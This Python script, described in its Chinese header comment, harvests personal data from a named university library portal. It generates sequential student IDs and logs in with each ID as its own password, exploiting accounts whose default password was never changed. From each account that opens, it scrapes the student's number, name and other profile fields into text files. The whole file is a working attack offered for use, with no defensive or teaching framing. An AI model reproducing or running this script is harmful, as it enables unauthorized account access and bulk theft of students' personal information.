#!/usr/bin/python3
#这是一个能够将图书馆未更改默认密码同学的学号，姓名等信息爬取下来##的脚本文件。
import requests
from bs4 import BeautifulSoup
import os


home_url = 'http://opac.lib.buaa.edu.cn/reader/lib_auth.php'
person = 'http://opac.lib.buaa.edu.cn/reader/redr_info.php'
if not os.path.exists('txt'):
    os.makedirs('txt')



class Library(object):
    def __init__(self, grade, dep):
        self.grade = grade
        self.dep = dep

    def get_num(self):
        list=[]
        for i in range(1000,1200):
            string = self.grade+self.dep+str(i)
            list.append(string)
        return list

    def login(self,num):
        agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
        headers = {
            'User-Agent': agent
        }
        data = {
            'userid': num,
            'password': num
        }
        with requests.session() as session:
            session.post(home_url, data=data, headers=headers)
            response = session.get(person)
            response.encoding = 'utf-8'
        return response

    def get_info(self,num):
        response = self.login(num)
        info = BeautifulSoup(response.text,'html.parser').find('div',attrs={'id': 'mylib_content'})
        if info:
            basic = info.find_all('td')
            basic_sort = []
            item = [1,2,10,12,15,16,18,21,24,25,26]
            for i in item:
                add = basic[i].get_text().replace('\n','').replace('\t','').replace(' ','').replace('\r','')
                basic_sort.append(add)
            return basic_sort
        else:
            return None

    def write(self,num,f):
        info = self.get_info(num)
        if info:
            for i in info:
                f.write(i)
            return 1
        else:
            return None

    def save(self):
        filename = 'txt/' + self.grade + self.dep + '.txt'
        f = open(filename, 'w+', encoding='utf-8')
        list = self.get_num()
        for num in list:
            if self.write(num,f):
                f.write('\n')
        f.close()


grade = '13'
# dep = '03'
# info = Library(grade, dep)
# info.save()


def error(grade, dep, list):
    print(grade + dep + 'error')
    list.append(dep)


def solve(list):
    repeat = []
    for dep in list:
        dep = int(dep)
        if dep < 10:
            dep = '0' + str(dep)
        else:
            dep = str(dep)
        info = Library(grade, dep)
        try:
            info.save()
            print(grade + dep + 'done')
        except requests.exceptions.ConnectionError:
            error(grade, dep,repeat)
            continue
        except ConnectionResetError:
            error(grade, dep,repeat)
            continue
        except TypeError:
            error(grade, dep,repeat)
            continue
        except TimeoutError:
            error(grade, dep, repeat)
            continue
    return repeat
test = solve(range(3,4))
while(test):
    test = solve(test)
